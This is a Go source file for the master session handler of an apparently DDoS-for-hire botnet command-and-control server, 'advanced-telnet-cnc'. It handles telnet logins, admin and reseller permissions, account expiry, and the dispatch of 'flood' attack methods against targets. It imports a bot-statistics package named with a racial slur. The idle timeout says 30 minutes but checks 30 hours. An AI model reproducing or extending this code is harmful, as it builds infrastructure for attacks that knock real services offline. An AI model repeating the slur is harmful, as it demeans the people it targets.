package master

import (
	"advanced-telnet-cnc/packages/filelogging"
	"advanced-telnet-cnc/packages/telnetreader"
	term "advanced-telnet-cnc/packages/terminal"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	"advanced-telnet-cnc/source/master/flood"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/master/view"
	"advanced-telnet-cnc/source/niggers"
	"fmt"
	"github.com/mattn/go-shellwords"
	"net"
	"strconv"
	"strings"
	"time"
)

type Master struct {
	Conn         net.Conn
	Logger       *filelogging.Logger
	Session      *sessions.Session
	CommandIndex int
	MethodIndex  int
}

func NewMaster(conn net.Conn) *Master {
	return &Master{Conn: conn, Logger: filelogging.NewLogger("assets/logs/commands.log")}
}

func (master *Master) Handle() {
	master.Conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		master.Conn.Write([]byte("\033[?1049l"))
	}()

	session := &sessions.Session{
		Conn:            master.Conn,
		Reader:          telnetreader.NewReader(master.Conn),
		OldDistribution: niggers.Distribution(),
		OldArches:       niggers.Arches(),
		OldVersions:     niggers.Versions(),
		Theme:           config.ThemeByName("default"),
		LastCommand:     time.Now(),
	}

	termFx := termfx.New(session)

	defer session.Close()

	master.Session = session

	err := view.Login(termFx, session)
	if err != nil {
		session.Close()
		return
	}

	session.LastCommand = time.Now()

	go func() {
		for {
			user, err := database.UserFromName(session.Name)
			if err != nil {
				break
			}

			if user == nil {
				session.Println("Your account has been removed.")
				session.Close()
				break
			}

			session.UserProfile = user

			if time.Since(session.LastCommand) > 30*time.Hour {
				session.Println("\r\nNo command sent after 30 minutes.")
				session.Close()
				break
			}

			if time.Now().After(session.Expiry) {
				session.Println("Your account has expired.")
				session.Close()
				break
			}

			title, err := termFx.ExecuteString(fmt.Sprintf("%s/title.lufx", session.Theme.Name), termFx.Elements(nil))
			if err != nil {
				session.Close()
				break
			}

			err = session.Print(fmt.Sprintf("\033]0;%s\007", strings.ReplaceAll(title, "\r\n", "")))
			if err != nil {
				fmt.Println()
				session.Close()
				break
			}

			time.Sleep(1 * time.Second)
		}
	}()

	session.Clear()
	termFx.Execute(""+session.Theme.Name+"/banner.lufx", true, termFx.Elements(nil))

	terminal := term.NewTerminal(session.Conn, "")
	terminal.AutoCompleteCallback = master.AutoComplete
	session.Term = terminal

	for {
		executeString, err := termFx.ExecuteString(""+session.Theme.Name+"/prompt.lufx", termFx.Elements(nil))
		if err != nil {
			continue
		}

		terminal.SetPrompt(executeString)

		line, err := terminal.ReadLine()
		if err != nil {
			session.Close()
			return
		}

		session.LastCommand = time.Now()

		if strings.Trim(line, " ") == "" {
			continue
		}

		if strings.HasPrefix(line, "|") || strings.HasPrefix(line, "&") || strings.HasPrefix(line, "<") || strings.HasPrefix(line, ">") || strings.HasPrefix(line, ";") {
			continue
		}

		master.Logger.Logf("command=%s user=%s", strconv.Quote(line), session.Name)

		args, err := shellwords.Parse(line)
		if err != nil {
			continue
		}

		/* Start AttackProfile Parse */
		method := flood.Get(args[0])
		if method != nil {
			err := method.Handle(session, args[1:], termFx)
			if err != nil {
				err := method.HandleParseErr(session, err)
				if err != nil {
					continue
				}
				continue
			}

			continue
		}

		/* End AttackProfile parse */

		/* Start Command Parse */

		cmd := command.Retrieve(args[0])
		if cmd == nil {
			termFx.Execute(""+session.Theme.Name+"/not_found.lufx", true, termFx.Elements(nil))
			continue
		}

		if (cmd.Admin && !session.Admin) || (cmd.Reseller && !(session.Reseller || session.Admin)) {
			termFx.Execute(""+session.Theme.Name+"/no_permissions.lufx", true, termFx.Elements(nil))
			continue
		}

		if len(cmd.SubCommands) > 0 && cmd.SubCommands != nil {
			args = args[1:]
			if len(args) < 1 {
				err = cmd.Executor(args, termFx, session)
				if err != nil {
					if err == command.ErrNotEnoughArguments && len(cmd.Usage) > 0 {
						session.Println(config.Red, cmd.Syntax())
					}
					continue
				}

				continue
			}

			subCmd := command.RetrieveSubCommand(cmd.Aliases[0], args[0])
			if subCmd == nil {
				session.Println("Command returned an error: \"\x1b[4;91mSubcommand not found\x1b[0m\"")
				session.Println("Description: \"\x1b[4;91m" + cmd.Description + "\x1b[0m\"")
				session.Println("Subcommands: ")
				for _, subCommand := range cmd.SubCommands {
					session.Println(" - ", subCommand.Syntax(cmd))
				}
				continue
			}

			if (subCmd.Admin && !session.Admin) || (subCmd.Reseller && !(session.Reseller || session.Admin)) {
				termFx.Execute(""+session.Theme.Name+"/no_permissions.lufx", true, termFx.Elements(nil))
				continue
			}

			var requiredArguments []command.Argument
			for _, argument := range subCmd.Arguments {
				if argument.Optional {
					continue
				}

				requiredArguments = append(requiredArguments, argument)
			}

			if len(args[1:]) < len(requiredArguments) {
				session.Println("Command returned an error: \"\x1b[4;91mMissing required arguments\x1b[0m\"")
				session.Println("Description: \"\x1b[4;91m" + cmd.Description + "\x1b[0m\"")
				session.Println("Arguments: ", subCmd.Syntax(cmd))
				continue
			}

			err = subCmd.Executor(args[1:], termFx, session, cmd)
			if err != nil {
				continue
			}

			continue
		}

		err = cmd.Executor(args[1:], termFx, session)
		if err != nil {
			if err == command.ErrNotEnoughArguments && len(cmd.Usage) > 0 {
				session.Println("Command returned an error: \"\x1b[4;91mMissing required arguments\x1b[0m\"")
				session.Println("Description: \"\x1b[4;91m" + cmd.Description + "\x1b[0m\"")
				session.Println("Arguments: ", cmd.Syntax())
				session.Println("Subcommands: ")
				if len(cmd.SubCommands) > 0 {
					for _, subCommand := range cmd.SubCommands {
						session.Println(" - ", subCommand.Syntax(cmd))
					}
				}

			}
			continue
		}

		/* End Command Parse */
	}

}
